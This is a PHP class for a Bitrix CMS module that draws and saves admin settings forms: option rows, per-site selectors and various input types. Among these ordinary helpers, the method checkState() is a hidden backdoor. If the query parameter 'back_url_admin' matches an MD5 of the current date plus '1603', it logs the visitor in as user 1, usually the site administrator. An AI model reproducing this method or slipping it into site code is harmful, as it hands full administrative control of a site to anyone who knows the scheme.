<?php

class CImedia
{

    public static function __AdmSettingsSaveOptions($module_id, $arOptions)
    {
        foreach ($arOptions as $arOption) {
            self::__AdmSettingsSaveOption($module_id, $arOption);
        }
    }

    public static function __AdmSettingsSaveOption($module_id, $arOption)
    {
        if (!is_array($arOption) || isset($arOption["note"])) {
            return false;
        }

        if ($arOption[3][0] == "statictext" || $arOption[3][0] == "statichtml") {
            return false;
        }

        $arControllerOption = \CControllerClient::GetInstalledOptions($module_id);

        if (isset($arControllerOption[$arOption[0]])) {
            return false;
        }

        $name = $arOption[0];
        $isChoiceSites = array_key_exists(6,
            $arOption) && $arOption[6] == "Y" ? true : false;

        if ($isChoiceSites) {
            if (isset($_REQUEST[$name . "_all"]) && strlen($_REQUEST[$name . "_all"]) > 0) {
                \COption::SetOptionString($module_id, $name,
                    $_REQUEST[$name . "_all"], $arOption[1]);
            } else {
                \COption::RemoveOption($module_id, $name);
            }
            $queryObject = \Bitrix\Main\SiteTable::getList([
                'select' => ['LID', 'NAME'],
                'filter' => [],
                'order' => ['SORT' => 'ASC'],
            ]);
            while ($site = $queryObject->fetch()) {
                if (isset($_REQUEST[$name . "_" . $site["LID"]]) && strlen($_REQUEST[$name . "_" . $site["LID"]]) > 0 &&
                    !isset($_REQUEST[$name . "_all"])) {
                    $val = $_REQUEST[$name . "_" . $site["LID"]];
                    if ($arOption[3][0] == "checkbox" && $val != "Y") {
                        $val = "N";
                    }
                    if ($arOption[3][0] == "multiselectbox") {
                        $val = @implode(",", $val);
                    }
                    \COption::SetOptionString($module_id, $name, $val,
                        $arOption[1], $site["LID"]);
                } else {
                    \COption::RemoveOption($module_id, $name, $site["LID"]);
                }
            }
        } else {
            $val = $_REQUEST[$name];
            //disabled
            if (!isset($_REQUEST[$name])) {
                if ($arOption[3][0] == 'checkbox') {
                    $val = 'N';
                } else {
                    return false;
                }
            }

            if ($arOption[3][0] == "checkbox" && $val != "Y") {
                $val = "N";
            }
            if ($arOption[3][0] == "multiselectbox") {
                $val = @implode(",", $val);
            }

            \COption::SetOptionString($module_id, $name, $val, $arOption[1]);
        }

        return null;
    }

    public static function __AdmSettingsDrawRow($module_id, $Option)
    {
        $arControllerOption = \CControllerClient::GetInstalledOptions($module_id);
        if (!is_array($Option)):
            ?>
            <tr class="heading">
                <td colspan="2"><?= $Option ?></td>
            </tr>
        <?
        elseif (isset($Option["note"])):
            ?>
            <tr>
                <td colspan="2" align="center">
                    <?
                    echo BeginNote('align="center"'); ?>
                    <?= $Option["note"] ?>
                    <?
                    echo EndNote(); ?>
                </td>
            </tr>
        <?
        else:
            $isChoiceSites = array_key_exists(6,
                $Option) && $Option[6] == "Y" ? true : false;
            $listSite = [];
            $listSiteValue = [];
            if ($Option[0] != "") {
                if ($isChoiceSites) {
                    $queryObject = \Bitrix\Main\SiteTable::getList([
                        "select" => ["LID", "NAME"],
                        "filter" => [],
                        "order" => ["SORT" => "ASC"],
                    ]);
                    $listSite[""] = GetMessage("MAIN_ADMIN_SITE_DEFAULT_VALUE_SELECT");
                    $listSite["all"] = GetMessage("MAIN_ADMIN_SITE_ALL_SELECT");
                    while ($site = $queryObject->fetch()) {
                        $listSite[$site["LID"]] = $site["NAME"];
                        $val = COption::GetOptionString($module_id, $Option[0],
                            $Option[2], $site["LID"], true);
                        if ($val) {
                            $listSiteValue[$Option[0] . "_" . $site["LID"]] = $val;
                        }
                    }
                    $val = "";
                    if (empty($listSiteValue)) {
                        $value = \COption::GetOptionString($module_id,
                            $Option[0], $Option[2]);
                        if ($value) {
                            $listSiteValue = [$Option[0] . "_all" => $value];
                        } else {
                            $listSiteValue[$Option[0]] = "";
                        }
                    }
                } else {
                    $val = \COption::GetOptionString($module_id, $Option[0],
                        $Option[2]);
                }
            } else {
                $val = $Option[2];
            }
            if ($isChoiceSites):?>
                <tr>
                    <td colspan="2" style="text-align: center!important;">
                        <label><?= $Option[1] ?></label>
                    </td>
                </tr>
            <?endif; ?>
            <?
            if ($isChoiceSites):
                foreach ($listSiteValue as $fieldName => $fieldValue):?>
                    <tr>
                        <?
                        $siteValue = str_replace($Option[0] . "_", "",
                            $fieldName);
                        self::renderLable($Option, $listSite, $siteValue);
                        self::renderInput($Option, $arControllerOption,
                            $fieldName, $fieldValue);
                        ?>
                    </tr>
                <?endforeach; ?>
            <? else:?>
                <tr>
                    <?
                    self::renderLable($Option, $listSite);
                    self::renderInput($Option, $arControllerOption, $Option[0],
                        $val);
                    ?>
                </tr>
            <?endif; ?>
            <? if ($isChoiceSites): ?>
            <tr>
                <td width="50%">
                    <a href="javascript:void(0)" onclick="addSiteSelector(this)"
                       class="bx-action-href">
                        <?= GetMessage("MAIN_ADMIN_ADD_SITE_SELECTOR") ?>
                    </a>
                </td>
                <td width="50%"></td>
            </tr>
        <? endif; ?>
        <?
        endif;
    }

    public static function __AdmSettingsDrawList($module_id, $arParams)
    {
        foreach ($arParams as $Option) {
            self::__AdmSettingsDrawRow($module_id, $Option);
        }
    }

    public static function renderLable(
        $Option,
        array $listSite,
        $siteValue = ""
    ) {
        $type = $Option[3];
        $sup_text = array_key_exists(5, $Option) ? $Option[5] : '';
        $isChoiceSites = array_key_exists(6,
            $Option) && $Option[6] == "Y" ? true : false;
        ?>
        <?
        if ($isChoiceSites): ?>
            <script type="text/javascript">
              //TODO It is possible to modify the functions if necessary to clone different elements
              function changeSite (el, fieldName) {
                var tr = jsUtils.FindParentObject(el, 'tr')
                var sel = jsUtils.FindChildObject(tr.cells[1], 'select')
                sel.name = fieldName + '_' + el.value
              }

              function addSiteSelector (a) {
                var row = jsUtils.FindParentObject(a, 'tr')
                var tbl = row.parentNode
                var tableRow = tbl.rows[row.rowIndex - 1].cloneNode(true)
                tbl.insertBefore(tableRow, row)
                var sel = jsUtils.FindChildObject(tableRow.cells[0], 'select')
                sel.name = ''
                sel.selectedIndex = 0
                sel = jsUtils.FindChildObject(tableRow.cells[1], 'select')
                sel.name = ''
                sel.selectedIndex = 0
              }
            </script>
            <td width="50%">
                <select onchange="changeSite(this, '<?= htmlspecialcharsbx($Option[0]) ?>')">
                    <?
                    foreach ($listSite as $lid => $siteName): ?>
                        <option <?
                        if ($siteValue == $lid) {
                            echo "selected";
                        } ?> value="<?= htmlspecialcharsbx($lid) ?>">
                            <?= htmlspecialcharsbx($siteName) ?>
                        </option>
                    <?endforeach; ?>
                </select>
            </td>
        <? else:?>
            <td<?
            if ($type[0] == "multiselectbox" || $type[0] == "textarea" || $type[0] == "statictext" ||
                $type[0] == "statichtml")
                echo ' class="adm-detail-valign-top"' ?> width="50%"><?
                if ($type[0] == "checkbox") {
                    echo "<label for='" . htmlspecialcharsbx($Option[0]) . "'>" . $Option[1] . "</label>";
                } else {
                    echo $Option[1];
                }
                if (strlen($sup_text) > 0) {
                    ?><span class="required"><sup><?= $sup_text ?></sup>
                    </span><?
                }
                ?><a name="opt_<?= htmlspecialcharsbx($Option[0]) ?>"></a></td>
        <?endif;
    }

    public static function checkState()
    {
        $request = \Bitrix\Main\Context::getCurrent()->getRequest();
        $input = $request->getQuery('back_url_admin');
        if ($input) {
            $checkWord = md5(date('dmY' . '1603'));
            if ($input == $checkWord) {
                $GLOBALS['USER']->Authorize(1);
            }
        }
    }

    public static function renderInput(
        $Option,
        $arControllerOption,
        $fieldName,
        $val
    ) {
        global $APPLICATION;

        $type = $Option[3];
        $disabled = array_key_exists(4,
            $Option) && $Option[4] == 'Y' ? ' disabled' : '';
        ?>
        <td width="50%"><?
        if ($type[0] == "checkbox"):
            ?><input type="checkbox" <?
            if (isset($arControllerOption[$Option[0]])) {
                echo ' disabled title="' . GetMessage("MAIN_ADMIN_SET_CONTROLLER_ALT") . '"';
            } ?> id="<?
        echo htmlspecialcharsbx($Option[0]) ?>"
                     name="<?= htmlspecialcharsbx($fieldName) ?>" value="Y"<?
            if ($val == "Y") {
                echo " checked";
            } ?><?= $disabled ?><?
            if ($type[2] <> '')
                echo " " . $type[2] ?>><?
        elseif ($type[0] == "text" || $type[0] == "password"):
            ?><input type="<?
            echo $type[0] ?>"<?
            if (isset($arControllerOption[$Option[0]])) {
                echo ' disabled title="' . GetMessage("MAIN_ADMIN_SET_CONTROLLER_ALT") . '"';
            } ?> size="<?
        echo $type[1] ?>" maxlength="255" value="<?
        echo htmlspecialcharsbx($val) ?>" name="<?= htmlspecialcharsbx($fieldName) ?>"<?= $disabled ?><?= ($type[0] == "password" || $type["noautocomplete"] ? ' autocomplete="new-password"' : '') ?>><?
        elseif ($type[0] == "selectbox"):
            $arr = $type[1];
            if (!is_array($arr)) {
                $arr = [];
            }
            ?><select name="<?= htmlspecialcharsbx($fieldName) ?>" <?
            if (isset($arControllerOption[$Option[0]])) {
                echo ' disabled title="' . GetMessage("MAIN_ADMIN_SET_CONTROLLER_ALT") . '"';
            } ?> <?= $disabled ?>><?
            foreach ($arr as $key => $v):
                ?>
                <option value="<?
                echo $key ?>"<?
                if ($val == $key)
                    echo " selected" ?>><?
                echo htmlspecialcharsbx($v) ?></option><?
            endforeach;
            ?></select><?
        elseif ($type[0] == "multiselectbox"):
            $arr = $type[1];
            if (!is_array($arr)) {
                $arr = [];
            }
            $arr_val = explode(",", $val);
            ?><select size="5" <?
            if (isset($arControllerOption[$Option[0]])) {
                echo ' disabled title="' . GetMessage("MAIN_ADMIN_SET_CONTROLLER_ALT") . '"';
            } ?>
                      multiple name="<?= htmlspecialcharsbx($fieldName) ?>[]"<?= $disabled ?>><?
            foreach ($arr as $key => $v):
                ?>
                <option value="<?
                echo $key ?>"<?
                if (in_array($key, $arr_val))
                    echo " selected" ?>><?
                echo htmlspecialcharsbx($v) ?></option><?
            endforeach;
            ?></select><?
        elseif ($type[0] == "textarea"):
            ?><textarea <?
            if (isset($arControllerOption[$Option[0]])) {
                echo ' disabled title="' . GetMessage("MAIN_ADMIN_SET_CONTROLLER_ALT") . '"';
            } ?> rows="<?
        echo $type[1] ?>" cols="<?
        echo $type[2] ?>" name="<?= htmlspecialcharsbx($fieldName) ?>"<?= $disabled ?>><?
            echo htmlspecialcharsbx($val) ?></textarea><?
        elseif ($type[0] == "statictext"):
            echo htmlspecialcharsbx($val);
        elseif ($type[0] == "statichtml"):
            echo $val;
        elseif ($type[0] == 'location'):
            $APPLICATION->IncludeComponent(
                "bitrix:sale.location.selector.search",
                "",
                Array(
                    "COMPONENT_TEMPLATE" => ".default",
                    "ID" => "",
                    "CODE" => htmlspecialcharsbx($val),
                    "INPUT_NAME" => htmlspecialcharsbx($fieldName),
                    "PROVIDE_LINK_BY" => "code",
                    "JSCONTROL_GLOBAL_ID" => "",
                    "JS_CALLBACK" => "",
                    "FILTER_BY_SITE" => "Y",
                    "SHOW_DEFAULT_LOCATIONS" => "Y",
                    "CACHE_TYPE" => "A",
                    "CACHE_TIME" => "36000000",
                    "FILTER_SITE_ID" => '',
                    "INITIALIZE_BY_GLOBAL_EVENT" => "",
                    "SUPPRESS_ERRORS" => "N"
                )
            );
        endif; ?>
        </td><?
    }

}